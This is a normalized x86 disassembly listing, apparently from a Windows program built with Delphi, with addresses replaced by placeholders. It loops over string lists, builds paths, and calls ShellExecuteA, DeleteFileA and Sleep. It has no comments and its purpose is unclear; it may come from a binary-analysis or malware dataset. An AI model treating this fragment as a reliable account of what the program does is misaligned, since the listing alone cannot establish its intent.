call [ ecx + 0x74 ]
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ rw-data ]
call sub_404e44
mov eax [ rw-data ]
call sub_404e44
push ebp
call sub_49f86c
pop ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
cmp eax 0x1e
ja r-xdata
lea ecx [ ebp - 0x1c0 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x28 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ecx [ ebp - 0x1c0 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d4f8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x368 ] ebx
mov [ ebx + 0xf ] 0x1
mov eax ebx
call sub_41d988
jmp r-xdata
lea eax [ ebp - 0x1f0 ]
call sub_45e31c
mov edx [ ebp - 0x1f0 ]
mov eax [ rw-data ]
call sub_4057bc
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax [ rw-data ]
push [ eax ]
lea ecx [ ebp - 0x1e8 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x1e8 ]
lea edx [ ebp - 0x1e4 ]
call sub_4093d8
mov edx [ ebp - 0x1e4 ]
lea eax [ ebp - 0x1e0 ]
call sub_4057bc
push [ ebp - 0x1e0 ]
push r-xdata
mov eax [ rw-data ]
mov edx 0x3
call sub_405858
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x1fc ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x1fc ]
lea edx [ ebp - 0x18 ]
call sub_4093d8
mov [ ebp - 0x35 ] 0x0
xor eax eax
push ebp
push sub_4a0265
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
call sub_409e18
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x220 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x220 ]
mov ecx esi
sub ecx ebx
dec ecx
lea edx [ ebx + 0x1 ]
call sub_405384
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax [ rw-data ]
push [ eax ]
lea ecx [ ebp - 0x250 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x250 ]
lea edx [ ebp - 0x24c ]
call sub_4093d8
mov edx [ ebp - 0x24c ]
lea eax [ ebp - 0x248 ]
call sub_4057bc
push [ ebp - 0x248 ]
push r-xdata
mov eax [ rw-data ]
mov edx 0x3
call sub_405858
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_405468
mov esi eax
test esi esi
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x25c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x25c ]
mov ecx esi
sub ecx ebx
dec ecx
lea edx [ ebx + 0x1 ]
call sub_405384
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x284 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x284 ]
lea edx [ ebp - 0x18 ]
call sub_4093d8
xor eax eax
push ebp
push sub_4a089f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
call sub_409e3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_4a0aea
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x2bc ]
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_40a0f8
mov eax [ ebp - 0x2bc ]
call sub_409e3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] esi
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x2a8 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x2a8 ]
lea edx [ ebp - 0x2a4 ]
call sub_4093d8
mov edx [ ebp - 0x2a4 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov esi [ ebp - 0x34 ]
inc esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_405324
push eax
push 0x0
push 0x0
call ShellExecuteA
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x2e4 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x2e4 ]
lea edx [ ebp - 0x2e0 ]
call sub_4093d8
mov edx [ ebp - 0x2e0 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
jmp r-xdata
xor eax eax
push ebp
push j_sub_404444#8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x31c ]
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_40a0f8
mov eax [ ebp - 0x31c ]
call sub_409e3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] esi
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x308 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x308 ]
lea edx [ ebp - 0x304 ]
call sub_4093d8
mov edx [ ebp - 0x304 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov esi [ ebp - 0x34 ]
inc esi
jmp r-xdata
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x344 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x344 ]
lea edx [ ebp - 0x18 ]
call sub_4093d8
mov [ ebp - 0x35 ] 0x0
xor eax eax
push ebp
push j_sub_404444#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
call sub_409df4
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_405270
jne r-xdata
push r-xdata
lea ecx [ ebp - 0x3bc ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x3bc ]
push r-xdata
lea eax [ ebp - 0x3b8 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x3b8 ]
lea edx [ ebp - 0x3b4 ]
call sub_45dfa8
mov edx [ ebp - 0x3b4 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
push r-xdata
lea ecx [ ebp - 0x3e0 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x3e0 ]
push r-xdata
lea eax [ ebp - 0x3dc ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x3dc ]
lea edx [ ebp - 0x3d8 ]
call sub_45dfa8
mov edx [ ebp - 0x3d8 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_405270
jne r-xdata
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
inc eax
mov [ ebp - 0x40 ] eax
xor esi esi
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax [ ebp - 0x18 ]
call sub_45e06c
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
jmp r-xdata
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x494 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x494 ]
lea edx [ ebp - 0x490 ]
call sub_4093d8
push [ ebp - 0x490 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x4d0 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4d0 ]
lea edx [ ebp - 0x18 ]
call sub_4093d8
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x4d8 ]
mov edx [ rw-data ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x4d8 ]
lea edx [ ebp - 0x4e0 ]
mov eax [ ebp - 0x34 ]
call sub_40987c
mov edx [ ebp - 0x4e0 ]
lea eax [ ebp - 0x4dc ]
call sub_4057bc
push [ ebp - 0x4dc ]
lea edx [ ebp - 0x4e8 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x4e8 ]
lea eax [ ebp - 0x4e4 ]
call sub_4057bc
push [ ebp - 0x4e4 ]
lea eax [ ebp - 0x4d4 ]
mov edx 0x4
call sub_405858
mov edx [ ebp - 0x4d4 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_4050e8
xor eax eax
push ebp
push sub_4a25ce
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push r-xdata
push [ ebp - 0x18 ]
push r-xdata
mov eax [ rw-data ]
push [ eax + 0x39c ]
lea eax [ ebp - 0x4ec ]
mov edx 0x4
call sub_4051e4
mov eax [ ebp - 0x4ec ]
call sub_405324
push eax
lea edx [ ebp - 0x4f0 ]
mov eax r-xdata
call sub_45ec84
mov eax [ ebp - 0x4f0 ]
call sub_405324
push eax
push 0x0
push 0x0
call ShellExecuteA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_405324
push eax
push 0x0
push 0x0
call ShellExecuteA
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x520 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x520 ]
lea edx [ ebp - 0x51c ]
call sub_4093d8
mov edx [ ebp - 0x51c ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
jmp r-xdata
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x544 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x544 ]
lea edx [ ebp - 0x18 ]
call sub_4093d8
xor eax eax
push ebp
push sub_4a2ad5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x2
mov eax [ ebp - 0x18 ]
call sub_409f34
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x1c ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x598 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x598 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x594 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x594 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
jmp r-xdata
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x590 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x590 ]
lea edx [ ebp - 0x58c ]
call sub_4093d8
mov edx [ ebp - 0x58c ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
jmp r-xdata
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x5b8 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x5b8 ]
lea edx [ ebp - 0x5b4 ]
call sub_4093d8
push [ ebp - 0x5b4 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
lea ecx [ ebp - 0x1dc ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x1dc ]
lea edx [ ebp - 0x1d8 ]
call sub_4093d8
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
lea ecx [ ebp - 0x1f8 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x1f8 ]
lea edx [ ebp - 0x1f4 ]
call sub_4093d8
cmp [ ebp - 0x1f4 ] 0x0
je r-xdata
mov [ ebp - 0x35 ] 0x1
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x200 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x200 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
mov eax [ ebp - 0x18 ]
call sub_45e160
jmp r-xdata
lea edx [ ebp - 0x238 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40942c
mov eax [ ebp - 0x238 ]
call sub_4057dc
cmp eax 0x2
jge r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
lea ecx [ ebp - 0x244 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x244 ]
lea edx [ ebp - 0x240 ]
call sub_4093d8
cmp [ ebp - 0x240 ] 0x0
je r-xdata
lea edx [ ebp - 0x274 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40942c
mov eax [ ebp - 0x274 ]
call sub_4057dc
cmp eax 0x2
jge r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ rw-data ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x18 ]
call sub_405384
mov ebx [ ebp - 0x18 ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x280 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x280 ]
lea edx [ ebp - 0x27c ]
call sub_4093d8
cmp [ ebp - 0x27c ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_409e18
test al al
je r-xdata
xor edx edx
push ebp
push sub_4a0bea
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x2c0 ]
mov eax [ ebp - 0x10 ]
call sub_45ec84
mov edx [ ebp - 0x2c0 ]
lea eax [ ebp - 0x10 ]
call sub_404edc
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x2b8 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x2b8 ]
lea edx [ ebp - 0x2b4 ]
call sub_4093d8
mov edx [ ebp - 0x2b4 ]
lea eax [ ebp - 0x10 ]
call sub_40512c
lea ecx [ ebp - 0x2a0 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x2a0 ]
lea edx [ ebp - 0x29c ]
call sub_4093d8
cmp [ ebp - 0x29c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
lea ecx [ ebp - 0x2dc ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x2dc ]
lea edx [ ebp - 0x2d8 ]
call sub_4093d8
cmp [ ebp - 0x2d8 ] 0x0
je r-xdata
xor edx edx
push ebp
push sub_4a1103
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x320 ]
mov eax [ ebp - 0x10 ]
call sub_45ec84
mov edx [ ebp - 0x320 ]
lea eax [ ebp - 0x10 ]
call sub_404edc
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x318 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x318 ]
lea edx [ ebp - 0x314 ]
call sub_4093d8
mov edx [ ebp - 0x314 ]
lea eax [ ebp - 0x10 ]
call sub_40512c
lea ecx [ ebp - 0x300 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x300 ]
lea edx [ ebp - 0x2fc ]
call sub_4093d8
cmp [ ebp - 0x2fc ] 0x0
je r-xdata
lea ecx [ ebp - 0x340 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x340 ]
lea edx [ ebp - 0x33c ]
call sub_4093d8
cmp [ ebp - 0x33c ] 0x0
je r-xdata
mov [ ebp - 0x35 ] 0x1
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x348 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x348 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
mov eax [ ebp - 0x18 ]
call sub_405324
push eax
call DeleteFileA
jmp r-xdata
push r-xdata
lea ecx [ ebp - 0x398 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x398 ]
push r-xdata
lea eax [ ebp - 0x394 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x394 ]
lea edx [ ebp - 0x390 ]
call sub_45dfa8
mov edx [ ebp - 0x390 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
push r-xdata
lea ecx [ ebp - 0x438 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x438 ]
push r-xdata
lea eax [ ebp - 0x434 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x434 ]
lea edx [ ebp - 0x430 ]
call sub_45dfa8
mov edx [ ebp - 0x430 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x400 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
push [ ebp - 0x400 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4051e4
push [ ebp - 0x1c ]
push r-xdata
lea ecx [ ebp - 0x408 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
push [ ebp - 0x408 ]
lea eax [ ebp - 0x404 ]
mov edx 0x3
call sub_4051e4
mov edx [ ebp - 0x404 ]
xor ecx ecx
mov eax ebx
call sub_420ec4
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_421468
mov eax ebx
call sub_420e2c
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push r-xdata
lea ecx [ ebp - 0x424 ]
mov edx esi
mov eax [ ebp - 0x28 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x424 ]
lea ecx [ ebp - 0x420 ]
mov eax ebx
call sub_421600
push [ ebp - 0x420 ]
push r-xdata
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_4051e4
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
lea ecx [ ebp - 0x41c ]
mov edx esi
mov eax [ ebp - 0x28 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x41c ]
mov eax ebx
call sub_4215a8
cmp al 0x2
jne r-xdata
lea ecx [ ebp - 0x470 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x470 ]
lea edx [ ebp - 0x46c ]
call sub_4093d8
mov eax [ ebp - 0x46c ]
lea edx [ ebp - 0x18 ]
call sub_4090e4
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x478 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x478 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x474 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x474 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
jmp r-xdata
push r-xdata
lea ecx [ ebp - 0x4b4 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x4b4 ]
push r-xdata
lea eax [ ebp - 0x4b0 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x4b0 ]
lea edx [ ebp - 0x4ac ]
call sub_45dfa8
mov edx [ ebp - 0x4ac ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
call sub_49e634
jmp r-xdata
lea ecx [ ebp - 0x48c ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x48c ]
lea edx [ ebp - 0x488 ]
call sub_4093d8
cmp [ ebp - 0x488 ] 0x0
je r-xdata
lea ecx [ ebp - 0x4cc ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4cc ]
lea edx [ ebp - 0x4c8 ]
call sub_4093d8
cmp [ ebp - 0x4c8 ] 0x0
je r-xdata
jmp r-xdata
push 0x15f90
call Sleep
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
lea ecx [ ebp - 0x518 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x518 ]
lea edx [ ebp - 0x514 ]
call sub_4093d8
cmp [ ebp - 0x514 ] 0x0
je r-xdata
lea ecx [ ebp - 0x540 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x540 ]
lea edx [ ebp - 0x53c ]
call sub_4093d8
cmp [ ebp - 0x53c ] 0x0
je r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x54c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x54c ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x548 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x548 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x5
call sub_4051e4
jmp r-xdata
lea edx [ ebp - 0x5a8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458fd4
mov eax [ ebp - 0x5a8 ]
call sub_49e60c
call sub_404c9c
push r-xdata
lea ecx [ ebp - 0x5a4 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x5a4 ]
push r-xdata
lea eax [ ebp - 0x5a0 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x5a0 ]
lea edx [ ebp - 0x59c ]
call sub_45dfa8
mov edx [ ebp - 0x59c ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
test bl bl
jne r-xdata
lea ecx [ ebp - 0x588 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x588 ]
lea edx [ ebp - 0x584 ]
call sub_4093d8
cmp [ ebp - 0x584 ] 0x0
je r-xdata
push r-xdata
lea ecx [ ebp - 0x5d8 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x5d8 ]
push r-xdata
lea eax [ ebp - 0x5d4 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x5d4 ]
lea edx [ ebp - 0x5d0 ]
call sub_45dfa8
mov edx [ ebp - 0x5d0 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
lea ecx [ ebp - 0x5b0 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x5b0 ]
lea edx [ ebp - 0x5ac ]
call sub_4093d8
cmp [ ebp - 0x5ac ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_409e18
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
